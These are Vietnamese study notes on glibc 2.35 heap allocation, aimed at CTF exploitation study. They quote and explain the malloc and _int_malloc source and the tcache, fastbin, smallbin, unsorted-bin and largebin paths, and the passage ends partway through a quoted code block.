# Heap

## Lý thuyết
- Heap là vùng nhớ riêng biệt so với các vùng nhớ khác, được trả về khi gọi các hàm malloc hay calloc, trong các hàm này có rất nhiều hoạt động trong chương trình --> ta sẽ có 1 vùng rộng lớn để khai thác hay tấn công

### Malloc
- Các hàm malloc hay calloc đều lấy từ libc, do đó mỗi libc khác nhau đều có thể dẫn tới các hành vi malloc khác nhau, nên khi ta khai thác cần chú ý phiên bản libc để tìm cách khai thác cho phù hợp
- Dưới đây là cách cấp phát bộ nhớ phiên bản glibc-2.35
```
void *
__libc_malloc (size_t bytes)
{
  mstate ar_ptr;
  void *victim;

  _Static_assert (PTRDIFF_MAX <= SIZE_MAX / 2,
                  "PTRDIFF_MAX is not more than half of SIZE_MAX");

  if (!__malloc_initialized)
    ptmalloc_init ();
#if USE_TCACHE
  /* int_free also calls request2size, be careful to not pad twice.  */
  size_t tbytes;
  if (!checked_request2size (bytes, &tbytes))
    {
      __set_errno (ENOMEM);
      return NULL;
    }
  size_t tc_idx = csize2tidx (tbytes);

  MAYBE_INIT_TCACHE ();

  DIAG_PUSH_NEEDS_COMMENT;
  if (tc_idx < mp_.tcache_bins
      && tcache
      && tcache->counts[tc_idx] > 0)
    {
      victim = tcache_get (tc_idx);
      return tag_new_usable (victim);
    }
  DIAG_POP_NEEDS_COMMENT;
#endif

  if (SINGLE_THREAD_P)
    {
      victim = tag_new_usable (_int_malloc (&main_arena, bytes));
      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||
	      &main_arena == arena_for_chunk (mem2chunk (victim)));
      return victim;
    }

  arena_get (ar_ptr, bytes);

  victim = _int_malloc (ar_ptr, bytes);
  /* Retry with another arena only if we were able to find a usable arena
     before.  */
  if (!victim && ar_ptr != NULL)
    {
      LIBC_PROBE (memory_malloc_retry, 1, bytes);
      ar_ptr = arena_get_retry (ar_ptr, bytes);
      victim = _int_malloc (ar_ptr, bytes);
    }

  if (ar_ptr != NULL)
    __libc_lock_unlock (ar_ptr->mutex);

  victim = tag_new_usable (victim);

  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||
          ar_ptr == arena_for_chunk (mem2chunk (victim)));
  return victim;
}
```
- `  if (!__malloc_initialized)
    ptmalloc_init ();` kiểm tra xem đã khởi tạo bộ nhớ chưa, nếu chưa gọi `ptmalloc_init ()` để chuẩn bị môi trường bộ nhớ như tcache, arena, ...
```
  size_t tbytes;
  if (!checked_request2size (bytes, &tbytes))
    {
      __set_errno (ENOMEM);
      return NULL;
    }
```
- kiểm tra kích thước xem hợp lệ hay không, và căn chỉnh kích thước vào `tbytes`
    - hàm check
```
static inline bool
checked_request2size (size_t req, size_t *sz) __nonnull (1)
{
  if (__glibc_unlikely (req > PTRDIFF_MAX))
    return false;

  /* When using tagged memory, we cannot share the end of the user
     block with the header for the next chunk, so ensure that we
     allocate blocks that are rounded up to the granule size.  Take
     care not to overflow from close to MAX_SIZE_T to a small
     number.  Ideally, this would be part of request2size(), but that
     must be a macro that produces a compile time constant if passed
     a constant literal.  */
  if (__glibc_unlikely (mtag_enabled))
    {
      /* Ensure this is not evaluated if !mtag_enabled, see gcc PR 99551.  */
      asm ("");

      req = (req + (__MTAG_GRANULE_SIZE - 1)) &
	    ~(size_t)(__MTAG_GRANULE_SIZE - 1);
    }

  *sz = request2size (req);
  return true;
}

```
- hàm căn chỉnh:



```
#define request2size(req)                                         \
  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE)  ?             \
   MINSIZE :                                                      \
   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK)
```
- chuyển từ kích thước sang chỉ số mảng:
    -  `size_t tc_idx = csize2tidx (tbytes);`
    -  `tc_idx` được tính bằng `# define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)`
- `  MAYBE_INIT_TCACHE ();` Nếu luồng hiện tại chưa có tcache thì khởi tạo
```
  DIAG_PUSH_NEEDS_COMMENT;
  if (tc_idx < mp_.tcache_bins
      && tcache
      && tcache->counts[tc_idx] > 0)
    {
      victim = tcache_get (tc_idx);
      return tag_new_usable (victim);
    }
  DIAG_POP_NEEDS_COMMENT;
```
- cái này sẽ kiểm tra xem tc_idx có thuộc kích thước tcache_bins không, tcache được khởi tạo chưa, và với bin tc_idx có vùng nhớ nào đã free chưa, nếu rồi thì lấy vùng nhớ đó tái sử dụng --> tăng tốc độ
```
  if (SINGLE_THREAD_P)
    {
      victim = tag_new_usable (_int_malloc (&main_arena, bytes));
      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||
	      &main_arena == arena_for_chunk (mem2chunk (victim)));
      return victim;
    }
```
- Nếu không sử dụng tcache, ta sẽ check xem chương trình có sử dụng đơn luồng không, vì đa số các bài CTF hiện nay thường sử dụng đơn luồng nên ta sẽ đi sâu vào đây
- cấp phát vùng nhớ mới qua `(_int_malloc (&main_arena, bytes)`
```
static void *
_int_malloc (mstate av, size_t bytes)
{
  INTERNAL_SIZE_T nb;               /* normalized request size */
  unsigned int idx;                 /* associated bin index */
  mbinptr bin;                      /* associated bin */

  mchunkptr victim;                 /* inspected/selected chunk */
  INTERNAL_SIZE_T size;             /* its size */
  int victim_index;                 /* its bin index */

  mchunkptr remainder;              /* remainder from a split */
  unsigned long remainder_size;     /* its size */

  unsigned int block;               /* bit map traverser */
  unsigned int bit;                 /* bit map traverser */
  unsigned int map;                 /* current word of binmap */

  mchunkptr fwd;                    /* misc temp for linking */
  mchunkptr bck;                    /* misc temp for linking */

#if USE_TCACHE
  size_t tcache_unsorted_count;	    /* count of unsorted chunks processed */
#endif

  /*
     Convert request size to internal form by adding SIZE_SZ bytes
     overhead plus possibly more to obtain necessary alignment and/or
     to obtain a size of at least MINSIZE, the smallest allocatable
     size. Also, checked_request2size returns false for request sizes
     that are so large that they wrap around zero when padded and
     aligned.
   */

  if (!checked_request2size (bytes, &nb))
    {
      __set_errno (ENOMEM);
      return NULL;
    }

  /* There are no usable arenas.  Fall back to sysmalloc to get a chunk from
     mmap.  */
  if (__glibc_unlikely (av == NULL))
    {
      void *p = sysmalloc (nb, av);
      if (p != NULL)
	alloc_perturb (p, bytes);
      return p;
    }

  /*
     If the size qualifies as a fastbin, first check corresponding bin.
     This code is safe to execute even if av is not yet initialized, so we
     can try it without checking, which saves some time on this fast path.
   */

#define REMOVE_FB(fb, victim, pp)			\
  do							\
    {							\
      victim = pp;					\
      if (victim == NULL)				\
	break;						\
      pp = REVEAL_PTR (victim->fd);                                     \
      if (__glibc_unlikely (pp != NULL && misaligned_chunk (pp)))       \
	malloc_printerr ("malloc(): unaligned fastbin chunk detected"); \
    }							\
  while ((pp = catomic_compare_and_exchange_val_acq (fb, pp, victim)) \
	 != victim);					\

  if ((unsigned long) (nb) <= (unsigned long) (get_max_fast ()))
    {
      idx = fastbin_index (nb);
      mfastbinptr *fb = &fastbin (av, idx);
      mchunkptr pp;
      victim = *fb;

      if (victim != NULL)
	{
	  if (__glibc_unlikely (misaligned_chunk (victim)))
	    malloc_printerr ("malloc(): unaligned fastbin chunk detected 2");

	  if (SINGLE_THREAD_P)
	    *fb = REVEAL_PTR (victim->fd);
	  else
	    REMOVE_FB (fb, pp, victim);
	  if (__glibc_likely (victim != NULL))
	    {
	      size_t victim_idx = fastbin_index (chunksize (victim));
	      if (__builtin_expect (victim_idx != idx, 0))
		malloc_printerr ("malloc(): memory corruption (fast)");
	      check_remalloced_chunk (av, victim, nb);
#if USE_TCACHE
	      /* While we're here, if we see other chunks of the same size,
		 stash them in the tcache.  */
	      size_t tc_idx = csize2tidx (nb);
	      if (tcache && tc_idx < mp_.tcache_bins)
		{
		  mchunkptr tc_victim;

		  /* While bin not empty and tcache not full, copy chunks.  */
		  while (tcache->counts[tc_idx] < mp_.tcache_count
			 && (tc_victim = *fb) != NULL)
		    {
		      if (__glibc_unlikely (misaligned_chunk (tc_victim)))
			malloc_printerr ("malloc(): unaligned fastbin chunk detected 3");
		      if (SINGLE_THREAD_P)
			*fb = REVEAL_PTR (tc_victim->fd);
		      else
			{
			  REMOVE_FB (fb, pp, tc_victim);
			  if (__glibc_unlikely (tc_victim == NULL))
			    break;
			}
		      tcache_put (tc_victim, tc_idx);
		    }
		}
#endif
	      void *p = chunk2mem (victim);
	      alloc_perturb (p, bytes);
	      return p;
	    }
	}
    }

  /*
     If a small request, check regular bin.  Since these "smallbins"
     hold one size each, no searching within bins is necessary.
     (For a large request, we need to wait until unsorted chunks are
     processed to find best fit. But for small ones, fits are exact
     anyway, so we can check now, which is faster.)
   */

  if (in_smallbin_range (nb))
    {
      idx = smallbin_index (nb);
      bin = bin_at (av, idx);

      if ((victim = last (bin)) != bin)
        {
          bck = victim->bk;
	  if (__glibc_unlikely (bck->fd != victim))
	    malloc_printerr ("malloc(): smallbin double linked list corrupted");
          set_inuse_bit_at_offset (victim, nb);
          bin->bk = bck;
          bck->fd = bin;

          if (av != &main_arena)
	    set_non_main_arena (victim);
          check_malloced_chunk (av, victim, nb);
#if USE_TCACHE
	  /* While we're here, if we see other chunks of the same size,
	     stash them in the tcache.  */
	  size_t tc_idx = csize2tidx (nb);
	  if (tcache && tc_idx < mp_.tcache_bins)
	    {
	      mchunkptr tc_victim;

	      /* While bin not empty and tcache not full, copy chunks over.  */
	      while (tcache->counts[tc_idx] < mp_.tcache_count
		     && (tc_victim = last (bin)) != bin)
		{
		  if (tc_victim != 0)
		    {
		      bck = tc_victim->bk;
		      set_inuse_bit_at_offset (tc_victim, nb);
		      if (av != &main_arena)
			set_non_main_arena (tc_victim);
		      bin->bk = bck;
		      bck->fd = bin;

		      tcache_put (tc_victim, tc_idx);
	            }
		}
	    }
#endif
          void *p = chunk2mem (victim);
          alloc_perturb (p, bytes);
          return p;
        }
    }

  /*
     If this is a large request, consolidate fastbins before continuing.
     While it might look excessive to kill all fastbins before
     even seeing if there is space available, this avoids
     fragmentation problems normally associated with fastbins.
     Also, in practice, programs tend to have runs of either small or
     large requests, but less often mixtures, so consolidation is not
     invoked all that often in most programs. And the programs that
     it is called frequently in otherwise tend to fragment.
   */

  else
    {
      idx = largebin_index (nb);
      if (atomic_load_relaxed (&av->have_fastchunks))
        malloc_consolidate (av);
    }

  /*
     Process recently freed or remaindered chunks, taking one only if
     it is exact fit, or, if this a small request, the chunk is remainder from
     the most recent non-exact fit.  Place other traversed chunks in
     bins.  Note that this step is the only place in any routine where
     chunks are placed in bins.

     The outer loop here is needed because we might not realize until
     near the end of malloc that we should have consolidated, so must
     do so and retry. This happens at most once, and only when we would
     otherwise need to expand memory to service a "small" request.
   */

#if USE_TCACHE
  INTERNAL_SIZE_T tcache_nb = 0;
  size_t tc_idx = csize2tidx (nb);
  if (tcache && tc_idx < mp_.tcache_bins)
    tcache_nb = nb;
  int return_cached = 0;

  tcache_unsorted_count = 0;
#endif

  for (;; )
    {
      int iters = 0;
      while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
        {
          bck = victim->bk;
          size = chunksize (victim);
          mchunkptr next = chunk_at_offset (victim, size);

          if (__glibc_unlikely (size <= CHUNK_HDR_SZ)
              || __glibc_unlikely (size > av->system_mem))
            malloc_printerr ("malloc(): invalid size (unsorted)");
          if (__glibc_unlikely (chunksize_nomask (next) < CHUNK_HDR_SZ)
              || __glibc_unlikely (chunksize_nomask (next) > av->system_mem))
            malloc_printerr ("malloc(): invalid next size (unsorted)");
          if (__glibc_unlikely ((prev_size (next) & ~(SIZE_BITS)) != size))
            malloc_printerr ("malloc(): mismatching next->prev_size (unsorted)");
          if (__glibc_unlikely (bck->fd != victim)
              || __glibc_unlikely (victim->fd != unsorted_chunks (av)))
            malloc_printerr ("malloc(): unsorted double linked list corrupted");
          if (__glibc_unlikely (prev_inuse (next)))
            malloc_printerr ("malloc(): invalid next->prev_inuse (unsorted)");

          /*
             If a small request, try to use last remainder if it is the
             only chunk in unsorted bin.  This helps promote locality for
             runs of consecutive small requests. This is the only
             exception to best-fit, and applies only when there is
             no exact fit for a small chunk.
           */

          if (in_smallbin_range (nb) &&
              bck == unsorted_chunks (av) &&
              victim == av->last_remainder &&
              (unsigned long) (size) > (unsigned long) (nb + MINSIZE))
            {
              /* split and reattach remainder */
              remainder_size = size - nb;
              remainder = chunk_at_offset (victim, nb);
              unsorted_chunks (av)->bk = unsorted_chunks (av)->fd = remainder;
              av->last_remainder = remainder;
              remainder->bk = remainder->fd = unsorted_chunks (av);
              if (!in_smallbin_range (remainder_size))
                {
                  remainder->fd_nextsize = NULL;
                  remainder->bk_nextsize = NULL;
                }

              set_head (victim, nb | PREV_INUSE |
                        (av != &main_arena ? NON_MAIN_ARENA : 0));
              set_head (remainder, remainder_size | PREV_INUSE);
              set_foot (remainder, remainder_size);

              check_malloced_chunk (av, victim, nb);
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p;
            }

          /* remove from unsorted list */
          if (__glibc_unlikely (bck->fd != victim))
            malloc_printerr ("malloc(): corrupted unsorted chunks 3");
          unsorted_chunks (av)->bk = bck;
          bck->fd = unsorted_chunks (av);

          /* Take now instead of binning if exact fit */

          if (size == nb)
            {
              set_inuse_bit_at_offset (victim, size);
              if (av != &main_arena)
		set_non_main_arena (victim);
#if USE_TCACHE
	      /* Fill cache first, return to user only if cache fills.
		 We may return one of these chunks later.  */
	      if (tcache_nb
		  && tcache->counts[tc_idx] < mp_.tcache_count)
		{
		  tcache_put (victim, tc_idx);
		  return_cached = 1;
		  continue;
		}
	      else
		{
#endif
              check_malloced_chunk (av, victim, nb);
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p;
#if USE_TCACHE
		}
#endif
            }

          /* place chunk in bin */

          if (in_smallbin_range (size))
            {
              victim_index = smallbin_index (size);
              bck = bin_at (av, victim_index);
              fwd = bck->fd;
            }
          else
            {
              victim_index = largebin_index (size);
              bck = bin_at (av, victim_index);
              fwd = bck->fd;

              /* maintain large bins in sorted order */
              if (fwd != bck)
                {
                  /* Or with inuse bit to speed comparisons */
                  size |= PREV_INUSE;
                  /* if smaller than smallest, bypass loop below */
                  assert (chunk_main_arena (bck->bk));
                  if ((unsigned long) (size)
		      < (unsigned long) chunksize_nomask (bck->bk))
                    {
                      fwd = bck;
                      bck = bck->bk;

                      victim->fd_nextsize = fwd->fd;
                      victim->bk_nextsize = fwd->fd->bk_nextsize;
                      fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
                    }
                  else
                    {
                      assert (chunk_main_arena (fwd));
                      while ((unsigned long) size < chunksize_nomask (fwd))
                        {
                          fwd = fwd->fd_nextsize;
			  assert (chunk_main_arena (fwd));
                        }

                      if ((unsigned long) size
			  == (unsigned long) chunksize_nomask (fwd))
                        /* Always insert in the second position.  */
                        fwd = fwd->fd;
                      else
                        {
                          victim->fd_nextsize = fwd;
                          victim->bk_nextsize = fwd->bk_nextsize;
                          if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd))
                            malloc_printerr ("malloc(): largebin double linked list corrupted (nextsize)");
                          fwd->bk_nextsize = victim;
                          victim->bk_nextsize->fd_nextsize = victim;
                        }
                      bck = fwd->bk;
                      if (bck->fd != fwd)
                        malloc_printerr ("malloc(): largebin double linked list corrupted (bk)");
                    }
                }
              else
                victim->fd_nextsize = victim->bk_nextsize = victim;
            }

          mark_bin (av, victim_index);
          victim->bk = bck;
          victim->fd = fwd;
          fwd->bk = victim;
          bck->fd = victim;

#if USE_TCACHE
      /* If we've processed as many chunks as we're allowed while
	 filling the cache, return one of the cached ones.  */
      ++tcache_unsorted_count;
      if (return_cached
	  && mp_.tcache_unsorted_limit > 0
	  && tcache_unsorted_count > mp_.tcache_unsorted_limit)
	{
	  return tcache_get (tc_idx);
	}
#endif

#define MAX_ITERS       10000
          if (++iters >= MAX_ITERS)
            break;
        }

#if USE_TCACHE
      /* If all the small chunks we found ended up cached, return one now.  */
      if (return_cached)
	{
	  return tcache_get (tc_idx);
	}
#endif

      /*
         If a large request, scan through the chunks of current bin in
         sorted order to find smallest that fits.  Use the skip list for this.
       */

      if (!in_smallbin_range (nb))
        {
          bin = bin_at (av, idx);

          /* skip scan if empty or largest chunk is too small */
          if ((victim = first (bin)) != bin
	      && (unsigned long) chunksize_nomask (victim)
	        >= (unsigned long) (nb))
            {
              victim = victim->bk_nextsize;
              while (((unsigned long) (size = chunksize (victim)) <
                      (unsigned long) (nb)))
                victim = victim->bk_nextsize;

              /* Avoid removing the first entry for a size so that the skip
                 list does not have to be rerouted.  */
              if (victim != last (bin)
		  && chunksize_nomask (victim)
		    == chunksize_nomask (victim->fd))
                victim = victim->fd;

              remainder_size = size - nb;
              unlink_chunk (av, victim);

              /* Exhaust */
              if (remainder_size < MINSIZE)
                {
                  set_inuse_bit_at_offset (victim, size);
                  if (av != &main_arena)
		    set_non_main_arena (victim);
                }
              /* Split */
              else
                {
                  remainder = chunk_at_offset (victim, nb);
                  /* We cannot assume the unsorted list is empty and therefore
                     have to perform a complete insert here.  */
                  bck = unsorted_chunks (av);
                  fwd = bck->fd;
		  if (__glibc_unlikely (fwd->bk != bck))
		    malloc_printerr ("malloc(): corrupted unsorted chunks");
                  remainder->bk = bck;
                  remainder->fd = fwd;
                  bck->fd = remainder;
                  fwd->bk = remainder;
                  if (!in_smallbin_range (remainder_size))
                    {
                      remainder->fd_nextsize = NULL;
                      remainder->bk_nextsize = NULL;
                    }
                  set_head (victim, nb | PREV_INUSE |
                            (av != &main_arena ? NON_MAIN_ARENA : 0));
                  set_head (remainder, remainder_size | PREV_INUSE);
                  set_foot (remainder, remainder_size);
                }
              check_malloced_chunk (av, victim, nb);
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p;
            }
        }

      /*
         Search for a chunk by scanning bins, starting with next largest
         bin. This search is strictly by best-fit; i.e., the smallest
         (with ties going to approximately the least recently used) chunk
         that fits is selected.

         The bitmap avoids needing to check that most blocks are nonempty.
         The particular case of skipping all bins during warm-up phases
         when no chunks have been returned yet is faster than it might look.
       */

      ++idx;
      bin = bin_at (av, idx);
      block = idx2block (idx);
      map = av->binmap[block];
      bit = idx2bit (idx);

      for (;; )
        {
          /* Skip rest of block if there are no more set bits in this block.  */
          if (bit > map || bit == 0)
            {
              do
                {
                  if (++block >= BINMAPSIZE) /* out of bins */
                    goto use_top;
                }
              while ((map = av->binmap[block]) == 0);

              bin = bin_at (av, (block << BINMAPSHIFT));
              bit = 1;
            }

          /* Advance to bin with set bit. There must be one. */
          while ((bit & map) == 0)
            {
              bin = next_bin (bin);
              bit <<= 1;
              assert (bit != 0);
            }

          /* Inspect the bin. It is likely to be non-empty */
          victim = last (bin);

          /*  If a false alarm (empty bin), clear the bit. */
          if (victim == bin)
            {
              av->binmap[block] = map &= ~bit; /* Write through */
              bin = next_bin (bin);
              bit <<= 1;
            }

          else
            {
              size = chunksize (victim);

              /*  We know the first chunk in this bin is big enough to use. */
              assert ((unsigned long) (size) >= (unsigned long) (nb));

              remainder_size = size - nb;

              /* unlink */
              unlink_chunk (av, victim);

              /* Exhaust */
              if (remainder_size < MINSIZE)
                {
                  set_inuse_bit_at_offset (victim, size);
                  if (av != &main_arena)
		    set_non_main_arena (victim);
                }

              /* Split */
              else
                {
                  remainder = chunk_at_offset (victim, nb);

                  /* We cannot assume the unsorted list is empty and therefore
                     have to perform a complete insert here.  */
                  bck = unsorted_chunks (av);
                  fwd = bck->fd;
		  if (__glibc_unlikely (fwd->bk != bck))
		    malloc_printerr ("malloc(): corrupted unsorted chunks 2");
                  remainder->bk = bck;
                  remainder->fd = fwd;
                  bck->fd = remainder;
                  fwd->bk = remainder;

                  /* advertise as last remainder */
                  if (in_smallbin_range (nb))
                    av->last_remainder = remainder;
                  if (!in_smallbin_range (remainder_size))
                    {
                      remainder->fd_nextsize = NULL;
                      remainder->bk_nextsize = NULL;
                    }
                  set_head (victim, nb | PREV_INUSE |
                            (av != &main_arena ? NON_MAIN_ARENA : 0));
                  set_head (remainder, remainder_size | PREV_INUSE);
                  set_foot (remainder, remainder_size);
                }
              check_malloced_chunk (av, victim, nb);
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p;
            }
        }

    use_top:
      /*
         If large enough, split off the chunk bordering the end of memory
         (held in av->top). Note that this is in accord with the best-fit
         search rule.  In effect, av->top is treated as larger (and thus
         less well fitting) than any other available chunk since it can
         be extended to be as large as necessary (up to system
         limitations).

         We require that av->top always exists (i.e., has size >=
         MINSIZE) after initialization, so if it would otherwise be
         exhausted by current request, it is replenished. (The main
         reason for ensuring it exists is that we may need MINSIZE space
         to put in fenceposts in sysmalloc.)
       */

      victim = av->top;
      size = chunksize (victim);

      if (__glibc_unlikely (size > av->system_mem))
        malloc_printerr ("malloc(): corrupted top size");

      if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE))
        {
          remainder_size = size - nb;
          remainder = chunk_at_offset (victim, nb);
          av->top = remainder;
          set_head (victim, nb | PREV_INUSE |
                    (av != &main_arena ? NON_MAIN_ARENA : 0));
          set_head (remainder, remainder_size | PREV_INUSE);

          check_malloced_chunk (av, victim, nb);
          void *p = chunk2mem (victim);
          alloc_perturb (p, bytes);
          return p;
        }

      /* When we are using atomic ops to free fast chunks we can get
         here for all block sizes.  */
      else if (atomic_load_relaxed (&av->have_fastchunks))
        {
          malloc_consolidate (av);
          /* restore original bin index */
          if (in_smallbin_range (nb))
            idx = smallbin_index (nb);
          else
            idx = largebin_index (nb);
        }

      /*
         Otherwise, relay to handle system-dependent cases
       */
      else
        {
          void *p = sysmalloc (nb, av);
          if (p != NULL)
            alloc_perturb (p, bytes);
          return p;
        }
    }
}
```
- chuẩn hóa kích thước:
```
  if (!checked_request2size (bytes, &nb))
    {
      __set_errno (ENOMEM);
      return NULL;
    }
```
- trường hợp không có vùng nhớ sẵn để sử dụng, gọi `sysmalloc`
```
  if (__glibc_unlikely (av == NULL))
    {
      void *p = sysmalloc (nb, av);
      if (p != NULL)
	alloc_perturb (p, bytes);
      return p;
    }
```
- kiểm tra kích thước có thuộc vùng fastbin không `if ((unsigned long) (nb) <= (unsigned long) (get_max_fast ()))`
- Nếu thỏa, lấy chunk đầu qua chỉ số idx trong danh sách fastbin
- Nếu thành công thì kiển tra xem có bị lỗi không
```
if (__glibc_unlikely (misaligned_chunk (victim)))
	    malloc_printerr ("malloc(): unaligned fastbin chunk detected 2");
```
- cập nhật lại danh sách fastbin: 2 trường hợp đơn luồng và đa luồng
```
	  if (SINGLE_THREAD_P)
	    *fb = REVEAL_PTR (victim->fd);
	  else
	    REMOVE_FB (fb, pp, victim);
```
- check lỗi xem victim có khác 0 và khớp với idx fastbin yêu cầu không
- đoạn sau kiểm tra xem tcache còn chỗ thì lưu nó vào tcache để tối ưu hơn
```
#if USE_TCACHE
	      /* While we're here, if we see other chunks of the same size,
		 stash them in the tcache.  */
	      size_t tc_idx = csize2tidx (nb);
	      if (tcache && tc_idx < mp_.tcache_bins)
		{
		  mchunkptr tc_victim;

		  /* While bin not empty and tcache not full, copy chunks.  */
		  while (tcache->counts[tc_idx] < mp_.tcache_count
			 && (tc_victim = *fb) != NULL)
		    {
		      if (__glibc_unlikely (misaligned_chunk (tc_victim)))
			malloc_printerr ("malloc(): unaligned fastbin chunk detected 3");
		      if (SINGLE_THREAD_P)
			*fb = REVEAL_PTR (tc_victim->fd);
		      else
			{
			  REMOVE_FB (fb, pp, tc_victim);
			  if (__glibc_unlikely (tc_victim == NULL))
			    break;
			}
		      tcache_put (tc_victim, tc_idx);
		    }
		}
```
- Nếu không nhét được vào tcache nữa, thì trả về con trỏ địa chỉ bộ nhớ fastbin
```
#endif
	      void *p = chunk2mem (victim);
	      alloc_perturb (p, bytes);
	      return p;
```
- nếu kích thước không hợp lệ trong fastbin, ta sẽ chuyển sang smallbin
```
if (in_smallbin_range (nb))
    {
      idx = smallbin_index (nb);
      bin = bin_at (av, idx);

      if ((victim = last (bin)) != bin)
        {
          bck = victim->bk;
	  if (__glibc_unlikely (bck->fd != victim))
	    malloc_printerr ("malloc(): smallbin double linked list corrupted");
          set_inuse_bit_at_offset (victim, nb);
          bin->bk = bck;
          bck->fd = bin;

          if (av != &main_arena)
	    set_non_main_arena (victim);
          check_malloced_chunk (av, victim, nb);
#if USE_TCACHE
	  /* While we're here, if we see other chunks of the same size,
	     stash them in the tcache.  */
	  size_t tc_idx = csize2tidx (nb);
	  if (tcache && tc_idx < mp_.tcache_bins)
	    {
	      mchunkptr tc_victim;

	      /* While bin not empty and tcache not full, copy chunks over.  */
	      while (tcache->counts[tc_idx] < mp_.tcache_count
		     && (tc_victim = last (bin)) != bin)
		{
		  if (tc_victim != 0)
		    {
		      bck = tc_victim->bk;
		      set_inuse_bit_at_offset (tc_victim, nb);
		      if (av != &main_arena)
			set_non_main_arena (tc_victim);
		      bin->bk = bck;
		      bck->fd = bin;

		      tcache_put (tc_victim, tc_idx);
	            }
		}
	    }
#endif
          void *p = chunk2mem (victim);
          alloc_perturb (p, bytes);
          return p;
        }
    }
```
- smallbin cũng tương tự trong fastbin, tuy nhiên con trỏ trong chunk là danh sách liên kết đôi
- nếu cần vùng nhớ lớn hơn smallbin, thì ta sẽ xác định thuộc idx nào trong largebin, sau đó gộp các chunk trong fastbin trước, để tránh có nhiều chunk nhỏ bị rải rác
- Nếu trên không được ta sẽ đi vào unsortbin
` while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))`
- vòng lặp kiểm tra từng chunk trong unsortbin
- kiểm tra lỗi
```
          if (__glibc_unlikely (size <= CHUNK_HDR_SZ)
              || __glibc_unlikely (size > av->system_mem))
            malloc_printerr ("malloc(): invalid size (unsorted)");
          if (__glibc_unlikely (chunksize_nomask (next) < CHUNK_HDR_SZ)
              || __glibc_unlikely (chunksize_nomask (next) > av->system_mem))
            malloc_printerr ("malloc(): invalid next size (unsorted)");
          if (__glibc_unlikely ((prev_size (next) & ~(SIZE_BITS)) != size))
            malloc_printerr ("malloc(): mismatching next->prev_size (unsorted)");
          if (__glibc_unlikely (bck->fd != victim)
              || __glibc_unlikely (victim->fd != unsorted_chunks (av)))
            malloc_printerr ("malloc(): unsorted double linked list corrupted");
          if (__glibc_unlikely (prev_inuse (next)))
            malloc_printerr ("malloc(): invalid next->prev_inuse (unsorted)");

```
- Nếu ta cần 1 vùng nhớ nhỏ hơn vùng nhớ có trong unsortbin, thì tách 1 phần của chunk trong unsortbin để dùng
```
          if (in_smallbin_range (nb) &&
              bck == unsorted_chunks (av) &&
              victim == av->last_remainder &&
              (unsigned long) (size) > (unsigned long) (nb + MINSIZE))
            {
              /* split and reattach remainder */
              remainder_size = size - nb;
              remainder = chunk_at_offset (victim, nb);
              unsorted_chunks (av)->bk = unsorted_chunks (av)->fd = remainder;
              av->last_remainder = remainder;
              remainder->bk = remainder->fd = unsorted_chunks (av);
              if (!in_smallbin_range (remainder_size))
                {
                  remainder->fd_nextsize = NULL;
                  remainder->bk_nextsize = NULL;
                }

              set_head (victim, nb | PREV_INUSE |
                        (av != &main_arena ? NON_MAIN_ARENA : 0));
              set_head (remainder, remainder_size | PREV_INUSE);
              set_foot (remainder, remainder_size);

              check_malloced_chunk (av, victim, nb);
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p;
            }
```
- Nếu có 1 chunk vừa với kích thước yêu cầu, thì dùng chunk đó luôn, và phải đá mắt qua xem thằng tcache còn chỗ không
```
          if (size == nb)
            {
              set_inuse_bit_at_offset (victim, size);
              if (av != &main_arena)
		set_non_main_arena (victim);
#if USE_TCACHE
	      /* Fill cache first, return to user only if cache fills.
		 We may return one of these chunks later.  */
	      if (tcache_nb
		  && tcache->counts[tc_idx] < mp_.tcache_count)
		{
		  tcache_put (victim, tc_idx);
		  return_cached = 1;
		  continue;
		}
	      else
		{
#endif
              check_malloced_chunk (av, victim, nb);
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p;
#if USE_TCACHE
		}
```
- còn không được thì sắp xếp lại các chunk vào smallbin và largebin
```
if (in_smallbin_range (size))
            {
              victim_index = smallbin_index (size);
              bck = bin_at (av, victim_index);
              fwd = bck->fd;
            }
          else
            {
              victim_index = largebin_index (size);
              bck = bin_at (av, victim_index);
              fwd = bck->fd;

              /* maintain large bins in sorted order */
              if (fwd != bck)
                {
                  /* Or with inuse bit to speed comparisons */
                  size |= PREV_INUSE;
                  /* if smaller than smallest, bypass loop below */
                  assert (chunk_main_arena (bck->bk));
                  if ((unsigned long) (size)
		      < (unsigned long) chunksize_nomask (bck->bk))
                    {
                      fwd = bck;
                      bck = bck->bk;

                      victim->fd_nextsize = fwd->fd;
                      victim->bk_nextsize = fwd->fd->bk_nextsize;
                      fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
                    }
                  else
                    {
                      assert (chunk_main_arena (fwd));
                      while ((unsigned long) size < chunksize_nomask (fwd))
                        {
                          fwd = fwd->fd_nextsize;
			  assert (chunk_main_arena (fwd));
                        }

                      if ((unsigned long) size
			  == (unsigned long) chunksize_nomask (fwd))
                        /* Always insert in the second position.  */
                        fwd = fwd->fd;
                      else
                        {
                          victim->fd_nextsize = fwd;
                          victim->bk_nextsize = fwd->bk_nextsize;
                          if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd))
                            malloc_printerr ("malloc(): largebin double linked list corrupted (nextsize)");
                          fwd->bk_nextsize = victim;
                          victim->bk_nextsize->fd_nextsize = victim;
                        }
                      bck = fwd->bk;
                      if (bck->fd != fwd)
                        malloc_printerr ("malloc(): largebin double linked list corrupted (bk)");
                    }
                }
              else
                victim->fd_nextsize = victim->bk_nextsize = victim;
            }

          mark_bin (av, victim_index);
          victim->bk = bck;
          victim->fd = fwd;
